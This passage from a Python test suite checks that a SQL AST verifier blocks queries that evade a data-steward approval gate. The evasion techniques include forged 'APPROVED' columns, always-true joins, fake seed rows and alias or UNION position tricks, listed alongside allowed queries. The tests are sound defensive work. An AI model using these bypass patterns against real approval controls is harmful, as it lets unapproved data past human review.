    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
                ir.links[2].model_copy(
                    update={"link_name": "lnk_doc_trade", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    # Compiled unstructured links (including attribute-bearing t_lnk_trade_exec shape) pass 8/8 dialects
    for tid in SQL_TARGET_IDS:
        bundle = SqlGlotVaultCompiler(tid).compile(ir_unstruct)
        assert gate.verify_sql_ast(tid, bundle.full_sql, ir=ir_unstruct) == [], tid

    blocked_iter15 = (
        # Defect 2: MERGE ... ON steward_gate_status = 'APPROVED' inversion
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u AND s.steward_gate_status = 'APPROVED' WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON s.steward_gate_status = 'APPROVED' WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        # Defect 3: CROSS JOIN / comma-join / INNER JOIN ON 1=1 / OR 1=1 / self-eq / NATURAL
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s CROSS JOIN (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g CROSS JOIN staging.s AS s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s, (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g, staging.s AS s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g ON 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g INNER JOIN staging.s AS s ON 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g ON TRUE",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g ON s.hk = g.hk OR 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g ON g.hk = g.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM staging.s2 b INNER JOIN (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a ON a.hk = b.hk CROSS JOIN staging.s3 c",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s NATURAL JOIN (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g",
        # Defect 4: Fake Zero-Key SYSTEM_SEED structural bypasses
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT CASE WHEN 1=0 THEN REPEAT('00', 32) ELSE 'deadbeef' END AS hk_u, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT CONCAT('evil_', REPEAT('00', 32)) AS hk_u, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT COALESCE('evil_key', REPEAT('00', 32)) AS hk_u, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT REPEAT('00', 32) || '_EVIL' AS hk_u, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, hk_issuer, rec_src) SELECT REPEAT('00', 32), 'evil_unapproved_issuer_hk', 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, fk_a, rec_src) SELECT REPEAT('00', 32) AS hk_u, 'NOT_ZERO' AS fk_a, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (rec_src, hk_u) SELECT REPEAT('00', 32) AS rec_src_dummy, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (payload, rec_src, hk_u) SELECT REPEAT('00', 32) AS dummy, 'SYSTEM_SEED' AS rec_src, 'evil_key'",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT src_q.evil_hk, src_q.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'evil_unapproved_hk' AS evil_hk, 'SYSTEM_SEED' AS rec_src) AS src_q",
        "INSERT INTO raw_vault.lnk_u SELECT REPEAT('00', 32), 'SYSTEM_SEED' AS rec_src",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES ('evil_unapproved_hk', 'UNAPPROVED_SRC')",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS s ON 1 = 0 WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES ('deadbeef', 'ROGUE_DOC')",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src, claim_text) VALUES ('1111111111111111111111111111111111111111111111111111111111111111', 'ROGUE', 'unapproved_claim')",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (s.hk_u, s.rec_src) WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES ('evil', 'evil')",
    )
    allowed_iter15 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM staging.s2 b INNER JOIN (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a CROSS JOIN (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED') b",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT UNHEX(REPEAT('00', 32)) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (s.hk_u, s.rec_src)",
    )
    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_iter15:
            d_bad = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in d_bad), (
                tid,
                bad_sql,
                d_bad,
            )
            bad_ir_sql = bad_sql.replace("lnk_u", "lnk_doc_claim")
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_ir_sql, ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50
        for ok_sql in allowed_iter15:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )

    # Defect 1: Real-row DuckDB materialize_duckdb_local with non-null ArrayType, MapType, nested Array/Map
    src_db = tmp_path / "enterprise_collections.duckdb"
    dconn = duckdb.connect(str(src_db))
    try:
        dconn.execute(
            "CREATE TABLE issuer_feed (issuer_cik VARCHAR, account_id VARCHAR, bkcc_src VARCHAR, "
            "alias_cik VARCHAR, proposal_seq INTEGER, owner_email VARCHAR, trade_qty BIGINT, "
            "steward_gate_status VARCHAR, issuer_name VARCHAR, seat_count INTEGER, market_cap BIGINT, "
            "nav_dec DECIMAL(18,4), founded_dt DATE, updated_ts TIMESTAMPTZ, is_active BOOLEAN, "
            "meta_json JSON, tags_arr VARCHAR[], attrs_map MAP(VARCHAR, BIGINT), "
            "nested_arr VARCHAR[][], nested_map MAP(VARCHAR, INTEGER[]))"
        )
        dconn.execute(
            "INSERT INTO issuer_feed VALUES "
            "('0000320193', 'ACCT-01', 'IBOR', '0000320193-ALT', 1, 'ir@apple.com', 100, 'APPROVED', "
            "'Apple Inc', 8, 3000000000000, 216.2800, DATE '1976-04-01', TIMESTAMPTZ '2026-10-20 18:00:00+00', "
            "TRUE, '{\"z\": 1}', ['t1', 't2'], MAP {'b': 2, 'a': 1}, [['a'], []], MAP {'m': [1, 2]}), "
            "('0000789019', 'ACCT-02', NULL, '0000789019-ALT', 2, 'ir@msft.com', 250, 'APPROVED', "
            "'Nordisk Suverän Fond', 12, 2800000000000, 412.5000, DATE '1975-04-04', TIMESTAMPTZ '2026-10-21 09:30:00+00', "
            "FALSE, '{}', [], MAP {}, [], MAP {}), "
            "('0000001800', 'ACCT-03', 'SEC', '0000001800-ALT', 3, NULL, 50, 'APPROVED', "
            "'Abbott Labs', 5, 100000000000, 100.0000, DATE '1900-01-01', TIMESTAMPTZ '2026-01-01 00:00:00+00', "
            "TRUE, NULL, NULL, NULL, NULL, NULL)"
        )
    finally:
        dconn.close()

    mat_res = materialize_duckdb_local(
        ir,
        tmp_path / "mat_collections",
        [SourceAttachment(source_id="src_ibor", kind="duckdb", path=src_db, table_name="issuer_feed")],
        metadata_only=False,
    )
    assert mat_res.verified is True and mat_res.rows_loaded == 3


def test_iter16_dv007_guard_and_seed_hardening() -> None:
    """Block all Iter-15 DV-AST-007 join/WHERE/forged-projection/seed bypasses across 8/8 dialects."""
    verifier = SqlAstVerifier()
    blocked_iter16 = (
        # 1. Unqualified column equality & unreferenced guarded table
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g ON s.hk = hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.id FROM (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g INNER JOIN staging.u_no_hk AS u ON g.hk = hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s1.hk FROM staging.s1 AS s1 INNER JOIN staging.s2 AS s2 ON s1.hk = s2.hk INNER JOIN (SELECT 1 AS x FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON s1.hk = s2.hk",
        # 2. WHERE short-circuit across CROSS / comma / ON 1=1 / LEFT JOIN / CTE / MERGE
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s CROSS JOIN staging.s2 AS g WHERE g.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s, staging.s2 AS g WHERE g.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN staging.s2 AS g ON 1 = 1 WHERE g.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s LEFT JOIN staging.s2 AS g ON 1 = 1 WHERE g.steward_gate_status = 'APPROVED'",
        "WITH d AS (SELECT 'APPROVED' AS steward_gate_status) INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s CROSS JOIN d WHERE d.steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT s.hk FROM staging.s AS s CROSS JOIN (SELECT 'APPROVED' AS steward_gate_status) AS d WHERE d.steward_gate_status = 'APPROVED') AS src ON tgt.hk_u = src.hk WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (src.hk)",
        # 3. LEFT JOIN skipping ON validation
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g LEFT JOIN staging.s AS u ON 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g LEFT JOIN staging.s AS u ON TRUE",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g LEFT JOIN staging.s AS u ON g.hk = g.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g LEFT JOIN staging.s AS u ON g.hk = u.hk OR 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g LEFT JOIN staging.s AS u ON g.hk <> u.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u.hk FROM (SELECT 1 AS x FROM staging.s2 WHERE steward_gate_status = 'APPROVED') AS g NATURAL LEFT JOIN staging.s AS u",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u2.hk FROM staging.s2 AS u1 INNER JOIN (SELECT hk FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON u1.hk = g.hk LEFT JOIN staging.s AS u2 ON 1 = 1",
        # 4. Multi-join boolean collapse
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u1.hk FROM staging.s AS u1 CROSS JOIN staging.s2 AS u2 INNER JOIN (SELECT hk FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON u2.hk = g.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u1.hk FROM staging.s AS u1, staging.s2 AS u2 INNER JOIN (SELECT hk FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON u2.hk = g.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u1.hk FROM staging.s AS u1 INNER JOIN staging.s2 AS u2 ON 1 = 1 INNER JOIN (SELECT hk FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON u2.hk = g.hk",
        # 5. Forged 'APPROVED' AS steward_gate_status in subquery / CTE / MERGE
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, 'APPROVED' AS steward_gate_status FROM staging.s) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "WITH sub AS (SELECT hk, 'APPROVED' AS steward_gate_status FROM staging.s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM sub WHERE steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT hk, 'APPROVED' AS steward_gate_status FROM staging.s) AS s ON tgt.hk_u = s.hk WHEN NOT MATCHED AND s.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT s.hk, d.steward_gate_status FROM staging.s AS s CROSS JOIN (SELECT 'APPROVED' AS steward_gate_status) AS d) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, COALESCE(steward_gate_status, 'APPROVED') AS steward_gate_status FROM staging.s) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, CASE WHEN 1=1 THEN 'APPROVED' ELSE steward_gate_status END AS steward_gate_status FROM staging.s) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, status_col AS steward_gate_status FROM staging.s) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        # 6. _seed_guard hardening
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src, load_dts) SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src, '1900-01-01_EVIL_PAYLOAD' AS load_dts",
        "INSERT INTO raw_vault.lnk_u SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src",
    )
    allowed_iter16 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s INNER JOIN staging.s2 AS g ON s.hk = g.hk WHERE g.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT s.hk, s.steward_gate_status FROM staging.s AS s) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "WITH sub AS (SELECT hk, steward_gate_status FROM staging.s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM sub WHERE steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT u1.hk FROM staging.s AS u1 INNER JOIN staging.s2 AS u2 ON u1.hk = u2.hk INNER JOIN (SELECT hk FROM staging.s3 WHERE steward_gate_status = 'APPROVED') AS g ON u2.hk = g.hk",
    )
    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_iter16:
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
        for ok_sql in allowed_iter16:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )


def test_iter16_collection_edge_cases_and_nonnull_seeds(tmp_path: Path) -> None:
    """Verify ArrayType(MapType), Decimal(38,10)<1e-4, BOOLEAN/TIMESTAMPTZ MapType keys, and nullable=False collection seeds."""

    def _build_coll_ir(
        col_type: PortableLogicalType,
        *,
        nullable: bool = True,
        key_coll: bool = False,
    ) -> CertifiedVaultIR:
        id_type: PortableLogicalType = col_type if key_coll else "UTF8_STRING"
        cols = [
            IRField(field_id=1, name="item_id", logical_type=id_type, nullable=False, is_pii=False),
            IRField(field_id=2, name="c", logical_type=col_type, nullable=nullable, is_pii=False),
        ]
        hk_r = HashRecipeSpec(
            target_col="hk_item", recipe_kind="HUB_HK", bkcc_literal="GLOBAL",
            source_columns=["item_id"], sort_alphabetically=False, key_columns=["item_id"],
        )
        hd_r = HashRecipeSpec(
            target_col="hash_diff", recipe_kind="SAT_HASH_DIFF",
            source_columns=["c"], sort_alphabetically=True, key_columns=["hk_item"],
        )
        return CertifiedVaultIR(
            project_id="proj_coll_edge", ontology_version="1.0.0", wave_number=1,
            bronze_tables=[BronzeTableSpec(table_name="bronze_items", source_id="src", source_table_id="src:items", columns=cols)],
            staging_views=[StagingViewSpec(view_name="stg_items", source_id="src", source_table_id="src:items", col_lineage_mappings={"item_id": "item_id", "c": "c"}, hash_recipes=[hk_r, hd_r], projected_fields=cols)],
            hubs=[CertifiedHubSpec(
                hub_name="hub_item", key_tier="TIER_1_GLOBAL_STANDARD",
                business_keys=[BusinessKeyPart(table_id="src:items", col_name="item_id", source_id="src", key_tier="TIER_1_GLOBAL_STANDARD", bkcc_value="GLOBAL")],
                source_bindings=[SourceBindingSpec(source_id="src", table_id="src:items", col_mappings={}, hash_recipe=hk_r)],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="bkcc", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=4, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=5, name="item_id", logical_type=id_type, nullable=False, is_pii=False),
                ],
                hash_recipe=hk_r, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item"]),
            )],
            satellites=[CertifiedSatelliteSpec(
                sat_name="sat_items", sat_kind="STANDARD", parent_name="hub_item", source_id="src", source_table_id="src:items",
                attributes=[DraftField(name="c", logical_type=col_type, nullable=nullable, is_pii=False)],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=5, name="c", logical_type=col_type, nullable=nullable, is_pii=False),
                ],
                hash_recipe=hd_r, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item", "load_dts"]),
            )],
        )

    cases: list[tuple[str, PortableLogicalType, str, str]] = [
        (
            "arr_map",
            ArrayType(element_type=MapType(key_type="UTF8_STRING", value_type="INT64")),
            "MAP(VARCHAR, BIGINT)[]",
            "('I1', [MAP {'z': 1, 'a': 2}, NULL, MAP {}]), ('I2', []), ('I3', NULL)",
        ),
        (
            "arr_dec38",
            ArrayType(element_type=DecimalType(precision=38, scale=10)),
            "DECIMAL(38,10)[]",
            "('I1', [0.0000100000, 0.0000010000, 1234567890123456.1234567890, -0.0000000000, NULL])",
        ),
        (
            "map_bool",
            MapType(key_type="BOOLEAN", value_type="UTF8_STRING"),
            "MAP(BOOLEAN, VARCHAR)",
            "('I1', MAP {TRUE: 'yes', FALSE: 'no'})",
        ),
        (
            "map_ts",
            MapType(key_type="TIMESTAMP_UTC_US", value_type="UTF8_STRING"),
            "MAP(TIMESTAMPTZ, VARCHAR)",
            "('I1', MAP {TIMESTAMPTZ '2026-10-20 18:00:00.123456+00': 'a'})",
        ),
    ]
    for cname, ltype, sql_t, vals_sql in cases:
        db_p = tmp_path / f"{cname}.duckdb"
        dc = duckdb.connect(str(db_p))
        try:
            dc.execute(f"CREATE TABLE items (item_id VARCHAR, c {sql_t})")
            dc.execute(f"INSERT INTO items VALUES {vals_sql}")
        finally:
            dc.close()
        res = materialize_duckdb_local(
            _build_coll_ir(ltype),
            tmp_path / f"out_{cname}",
            [SourceAttachment(source_id="src", kind="duckdb", path=db_p, table_name="items")],
            metadata_only=False,
        )
        assert res.verified is True and res.rows_loaded >= 1, cname

    # Non-nullable ArrayType, MapType, and HUB_HK ArrayType metadata_only=True + 8/8 dialects
    for idx, (lt, key_coll) in enumerate(
        [
            (ArrayType(element_type="UTF8_STRING"), False),
            (MapType(key_type="UTF8_STRING", value_type="INT64"), False),
            (ArrayType(element_type="UTF8_STRING"), True),
        ]
    ):
        ir_nn = _build_coll_ir(lt, nullable=False, key_coll=key_coll)
        res_nn = materialize_duckdb_local(ir_nn, tmp_path / f"out_nn_{idx}", metadata_only=True)
        assert res_nn.verified is True
        gate = TargetEvalGate()
        for tid in SQL_TARGET_IDS:
            b = SqlGlotVaultCompiler(tid).compile(ir_nn)
            assert gate.verify_sql_ast(tid, b.full_sql, ir=ir_nn) == [], (tid, lt)


def test_iter17_dv007_positional_alias_union_dup_table_and_seed_newline() -> None:
    """Block TableAlias.columns, SetOperation ordinal shifts, cross-schema duplicate tables, and seed newline across 8/8 dialects."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    blocked_iter17 = (
        # 1. Positional TableAlias.columns on CTE / Subquery / MERGE USING / Table
        "WITH c(hk, steward_gate_status, fake) AS (SELECT hk, 'APPROVED', steward_gate_status FROM staging.s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
        "WITH sub(hk, fake, steward_gate_status) AS (SELECT *, 'APPROVED' FROM staging.s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM sub WHERE steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, 'APPROVED', steward_gate_status FROM staging.s) AS sub(hk, steward_gate_status, fake) WHERE sub.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT *, 'APPROVED' FROM staging.s) AS sub(hk, fake, steward_gate_status) WHERE sub.steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT hk, 'APPROVED', steward_gate_status FROM staging.s) AS s(hk, steward_gate_status, fake) ON tgt.hk_u = s.hk WHEN NOT MATCHED AND s.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT t.hk FROM staging.s AS t(hk, steward_gate_status, fake) WHERE t.steward_gate_status = 'APPROVED'",
        # 2. SetOperation ordinal column-position shift & wildcard ambiguity
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT s1.hk, s1.steward_gate_status, s1.other_col FROM staging.s AS s1 WHERE 1 = 0 UNION ALL SELECT s2.hk, 'APPROVED' AS other_col, s2.steward_gate_status FROM staging.s AS s2) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "WITH c AS (SELECT s1.hk, s1.steward_gate_status, s1.other_col FROM staging.s AS s1 WHERE 1 = 0 UNION ALL SELECT s2.hk, 'APPROVED' AS other_col, s2.steward_gate_status FROM staging.s AS s2) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT hk, steward_gate_status, other_col FROM staging.s2 UNION ALL SELECT hk, 'APPROVED' AS dummy, steward_gate_status FROM staging.s) AS sub ON tgt.hk_u = sub.hk WHEN NOT MATCHED AND sub.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (sub.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, steward_gate_status, other_col FROM staging.s1 WHERE steward_gate_status = 'APPROVED' UNION ALL SELECT hk, 'APPROVED' AS dummy, steward_gate_status FROM staging.s2) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT *, 'APPROVED' AS dummy FROM staging.s1 WHERE 1 = 0 UNION ALL SELECT 'APPROVED' AS dummy, * FROM staging.s2) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        # 3. Duplicate unaliased table names across distinct schemas
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT g.hk FROM bronze.g CROSS JOIN staging.g WHERE g.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT g.hk FROM bronze.g INNER JOIN staging.g ON g.hk = g.hk WHERE g.steward_gate_status = 'APPROVED'",
        # 4. _GHOST_TS_RE trailing newline anchor
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src, load_dts) SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src, '1900-01-01\n' AS load_dts",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src, load_dts) SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src, '1900-01-01T00:00:00Z\n' AS load_dts",
    )
    allowed_iter17 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT sub.hk FROM (SELECT hk, steward_gate_status FROM staging.s1 UNION ALL SELECT hk, steward_gate_status FROM staging.s2) AS sub WHERE sub.steward_gate_status = 'APPROVED'",
        "WITH c AS (SELECT hk, steward_gate_status FROM staging.s1 UNION ALL SELECT hk, steward_gate_status FROM staging.s2) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT hk, steward_gate_status FROM staging.s1 UNION ALL SELECT hk, steward_gate_status FROM staging.s2) AS sub ON tgt.hk_u = sub.hk WHEN NOT MATCHED AND sub.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (sub.hk)",
        "WITH c(a, b) AS (SELECT hk, col FROM staging.s WHERE steward_gate_status = 'APPROVED') INSERT INTO raw_vault.lnk_u (hk_u) SELECT a FROM c",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT b.hk FROM bronze.g AS b INNER JOIN staging.g AS s ON b.hk = s.hk WHERE s.steward_gate_status = 'APPROVED'",
    )

    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_iter17:
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
            bad_ir_sql = bad_sql.replace("lnk_u", "lnk_doc_claim")
